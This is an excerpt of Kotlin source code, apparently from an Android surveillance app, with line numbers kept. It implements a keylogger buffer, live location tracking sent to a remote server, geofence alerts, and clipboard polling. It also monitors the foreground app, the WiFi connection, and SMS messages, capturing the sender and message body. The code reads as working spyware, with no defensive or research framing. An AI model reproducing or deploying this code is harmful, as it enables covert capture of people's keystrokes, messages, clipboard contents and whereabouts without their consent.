   163→    fun appendKeylog(packageName: String, text: String, viewType: String = "text") {
   164→        if (keyloggerActive) {
   165→            val entry = KeylogEntry(
   166→                timestamp = System.currentTimeMillis(),
   167→                packageName = packageName,
   168→                text = text,
   169→                viewType = viewType
   170→            )
   171→            keylogBuffer.add(entry)
   172→            
   173→            // Limit buffer size
   174→            while (keylogBuffer.size > MAX_KEYLOG_SIZE) {
   175→                keylogBuffer.poll()
   176→            }
   177→            
   178→            // Save to file
   179→            saveKeylogToFile(entry)
   180→        }
   181→    }

   236→    fun locationLiveStart(context: Context, intervalSeconds: Int = 30): String {
   237→        if (locationTrackingActive) {
   238→            return "Location tracking already active"
   239→        }
   240→        
   241→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
   242→            != PackageManager.PERMISSION_GRANTED &&
   243→            ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) 
   244→            != PackageManager.PERMISSION_GRANTED) {
   245→            return "Location permission not granted"
   246→        }
   247→        
   248→        locationTrackingActive = true
   249→        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
   250→        
   251→        // Create location listener
   252→        locationListener = object : LocationListener {
   253→            override fun onLocationChanged(location: Location) {
   254→                addLocationToHistory(
   255→                    location.latitude,
   256→                    location.longitude,
   257→                    location.accuracy,
   258→                    location.speed,
   259→                    location.altitude,
   260→                    location.provider ?: "unknown"
   261→                )
   262→                
   263→                // Check geofences
   264→                checkGeofences(location.latitude, location.longitude, context)
   265→                
   266→                // Send to server
   267→                CoroutineScope(Dispatchers.IO).launch {
   268→                    try {
   269→                        ApiClient.sendLocation(
   270→                            context,
   271→                            location.latitude,
   272→                            location.longitude,
   273→                            location.accuracy
   274→                        )
   275→                    } catch (_: Exception) {}
   276→                }
   277→            }
   278→            
   279→            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
   280→            override fun onProviderEnabled(provider: String) {}
   281→            override fun onProviderDisabled(provider: String) {}
   282→        }
   283→        
   284→        // Request updates
   285→        try {
   286→            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
   287→                lm.requestLocationUpdates(
   288→                    LocationManager.GPS_PROVIDER,
   289→                    (intervalSeconds * 1000).toLong(),
   290→                    10f,
   291→                    locationListener!!,
   292→                    Looper.getMainLooper()
   293→                )
   294→            }
   295→            
   296→            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
   297→                lm.requestLocationUpdates(
   298→                    LocationManager.NETWORK_PROVIDER,
   299→                    (intervalSeconds * 1000).toLong(),
   300→                    10f,
   301→                    locationListener!!,
   302→                    Looper.getMainLooper()
   303→                )
   304→            }
   305→            
   306→            // Get last known location immediately
   307→            val lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
   308→                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
   309→            
   310→            if (lastKnown != null) {
   311→                addLocationToHistory(
   312→                    lastKnown.latitude,
   313→                    lastKnown.longitude,
   314→                    lastKnown.accuracy,
   315→                    lastKnown.speed,
   316→                    lastKnown.altitude,
   317→                    lastKnown.provider ?: "unknown"
   318→                )
   319→            }
   320→            
   321→            return "Live location tracking started (interval: ${intervalSeconds}s)"
   322→        } catch (e: Exception) {
   323→            Log.e(TAG, "Location tracking start error", e)
   324→            locationTrackingActive = false
   325→            return "Error: ${e.message}"
   326→        }
   327→    }

   342→    fun addLocationToHistory(lat: Double, lon: Double, accuracy: Float = 0f, speed: Float = 0f, altitude: Double = 0.0, provider: String = "unknown") {
   343→        val entry = LocationEntry(
   344→            timestamp = System.currentTimeMillis(),
   345→            lat = lat,
   346→            lon = lon,
   347→            accuracy = accuracy,
   348→            speed = speed,
   349→            altitude = altitude,
   350→            provider = provider

   354→        // Limit history
   355→        while (locationHistory.size > MAX_LOCATION_HISTORY) {
   356→            locationHistory.poll()

   359→        // Save to file
   360→        saveLocationToFile(entry)
   361→    }

   400→    fun geoAdd(params: Map<String, Any>): String {
   401→        val arg = params["arg"]?.toString() ?: ""
   402→        val parts = arg.split(",")
   403→        
   404→        return if (parts.size >= 2) {
   405→            val lat = parts[0].trim().toDoubleOrNull()
   406→            val lon = parts[1].trim().toDoubleOrNull()
   407→            val radius = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 500
   408→            val name = parts.getOrNull(3)?.trim()
   409→            
   410→            if (lat != null && lon != null) {
   411→                val fence = GeoFence(
   412→                    id = java.util.UUID.randomUUID().toString(),
   413→                    lat = lat,
   414→                    lon = lon,
   415→                    radius = radius,
   416→                    active = true,
   417→                    name = name
   418→                )
   419→                geoFences.add(fence)
   420→                saveGeofences()
   421→                "Geofence added: ${fence.id} at ($lat, $lon) radius ${radius}m"
   422→            } else {
   423→                "Invalid coordinates"
   424→            }
   425→        } else {
   426→            "Usage: lat,lon,radius,name"
   427→        }
   428→    }

   468→    private fun checkGeofences(lat: Double, lon: Double, context: Context) {
   469→        for (fence in geoFences.filter { it.active }) {
   470→            val distance = calculateDistance(lat, lon, fence.lat, fence.lon)
   471→            
   472→            if (distance <= fence.radius) {
   473→                // Buffer event locally
   474→                com.abuzahra.manager.EventBuffer.addEvent(
   475→                    "geofence_entered",
   476→                    mapOf(
   477→                        "fence_id" to fence.id,
   478→                        "fence_name" to (fence.name ?: "Unnamed"),
   479→                        "distance" to distance
   480→                    )
   481→                )
   482→            }
   483→        }
   484→    }
   485→    
   486→    private fun calculateDistance(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Float {
   487→        val results = FloatArray(1)
   488→        Location.distanceBetween(lat1, lon1, lat2, lon2, results)
   489→        return results[0]
   490→    }

   530→    // ===== CLIPBOARD MONITOR =====
   531→    fun clipboardMonitorStart(context: Context): String {
   532→        if (clipboardMonitorActive) {
   533→            return "Clipboard monitoring already active"
   534→        }
   535→        
   536→        clipboardMonitorActive = true
   537→        
   538→        clipboardJob = CoroutineScope(Dispatchers.IO).launch {
   539→            var lastClipboard = ""
   540→            
   541→            while (isActive && clipboardMonitorActive) {
   542→                try {
   543→                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
   544→                    val clip = clipboard.primaryClip
   545→                    
   546→                    if (clip != null && clip.itemCount > 0) {
   547→                        val text = clip.getItemAt(0).text?.toString() ?: ""
   548→                        
   549→                        if (text.isNotEmpty() && text != lastClipboard) {
   550→                            lastClipboard = text
   551→                            
   552→                            val entry = ClipboardEntry(
   553→                                timestamp = System.currentTimeMillis(),
   554→                                text = text,
   555→                                sourcePackage = clip.description?.label?.toString()
   556→                            )
   557→                            clipboardHistory.add(entry)
   558→                            
   559→                            while (clipboardHistory.size > MAX_CLIPBOARD_HISTORY) {
   560→                                clipboardHistory.poll()
   561→                            }
   562→                            
   563→                            // Buffer event locally
   564→                            com.abuzahra.manager.EventBuffer.addEvent(
   565→                                "clipboard_change",
   566→                                mapOf("text" to text.take(500))
   567→                            )
   568→                        }
   569→                    }
   570→                    
   571→                    delay(2000) // Check every 2 seconds
   572→                } catch (e: Exception) {
   573→                    Log.e(TAG, "Clipboard monitor error", e)
   574→                    delay(5000)
   575→                }
   576→            }
   577→        }
   578→        
   579→        return "Clipboard monitoring started"
   580→    }

   608→    fun wifiMonitorStart(context: Context): String {
   609→        if (wifiMonitorActive) {
   610→            return "WiFi monitoring already active"
   611→        }
   612→        
   613→        wifiMonitorActive = true
   614→        
   615→        wifiJob = CoroutineScope(Dispatchers.IO).launch {
   616→            var lastWifi = ""
   617→            
   618→            while (isActive && wifiMonitorActive) {
   619→                try {
   620→                    val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
   621→                    
   622→                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
   623→                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
   624→                            != PackageManager.PERMISSION_GRANTED) {
   625→                            delay(30000)
   626→                            continue
   627→                        }
   628→                    }
   629→                    
   630→                    val currentWifi = wm.connectionInfo

   641→                    }
   642→                    
   643→                    delay(30000) // Check every 30 seconds
   644→                } catch (e: Exception) {

   664→    fun appMonitorStart(context: Context): String {
   665→        if (appMonitorActive) {
   666→            return "App monitoring already active"
   667→        }
   668→        
   669→        appMonitorActive = true
   670→        
   671→        appMonitorJob = CoroutineScope(Dispatchers.IO).launch {
   672→            var lastApp = ""
   673→            
   674→            while (isActive && appMonitorActive) {
   675→                try {
   676→                    // Get foreground app using usage stats
   677→                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
   678→                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.PACKAGE_USAGE_STATS) 
   679→                            == PackageManager.PERMISSION_GRANTED) {
   680→                            
   681→                            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) 
   682→                                as android.app.usage.UsageStatsManager
   683→                            
   684→                            val endTime = System.currentTimeMillis()
   685→                            val startTime = endTime - 60000
   686→                            
   687→                            val usageStats = usageStatsManager.queryUsageStats(
   688→                                android.app.usage.UsageStatsManager.INTERVAL_DAILY,
   689→                                startTime, endTime
   690→                            )
   691→                            
   692→                            val foregroundApp = usageStats
   693→                                .filter { it.lastTimeUsed > startTime }
   694→                                .maxByOrNull { it.lastTimeUsed }
   695→                                ?.packageName ?: ""
   696→                            
   697→                            if (foregroundApp.isNotEmpty() && foregroundApp != lastApp) {
   698→                                lastApp = foregroundApp
   699→                                
   700→                                val entry = AppUsageEntry(
   701→                                    timestamp = System.currentTimeMillis(),
   702→                                    packageName = foregroundApp,
   703→                                    eventType = "foreground",
   704→                                    duration = 0
   705→                                )
   706→                                appUsageLog.add(entry)
   707→                                
   708→                                // Buffer event locally
   709→                                com.abuzahra.manager.EventBuffer.addEvent(
   710→                                    "app_change",
   711→                                    mapOf("package" to foregroundApp)
   712→                                )
   713→                            }
   714→                        }
   715→                    }
   716→                    
   717→                    delay(5000) // Check every 5 seconds
   718→                } catch (e: Exception) {
   719→                    Log.e(TAG, "App monitor error", e)
   720→                    delay(10000)
   721→                }
   722→            }
   723→        }
   724→        
   725→        return "App monitoring started"
   726→    }

   774→                        context.contentResolver.query(uri, projection, null, null, "${Telephony.Sms._ID} DESC LIMIT 1")?.use { cursor ->
   775→                            if (cursor.moveToFirst()) {
   776→                                val id = cursor.getLong(0)
   777→                                
   778→                                if (id > lastSmsId) {
   779→                                    lastSmsId = id
   780→                                    
   781→                                    val address = cursor.getString(1)
   782→                                    val body = cursor.getString(2)
   783→                                    val date = cursor.getLong(3)

   785→

   787→                                    com.abuzahra.manager.EventBuffer.addEvent(
   788→                                        "sms_received",
   789→                                        mapOf(
   790→                                            "from" to address,
   791→                                            "body" to body,
   792→                                            "type" to (if (type == 1) "received" else "sent")
   793→                                        )
   794→                                    )
   795→                                }
   796→                            }
   797→                        }
   798→                    }
   799→                    
   800→                    delay(10000) // Check every 10 seconds

   802→                    Log.e(TAG, "SMS monitor error", e)
   803→                    delay(30000)
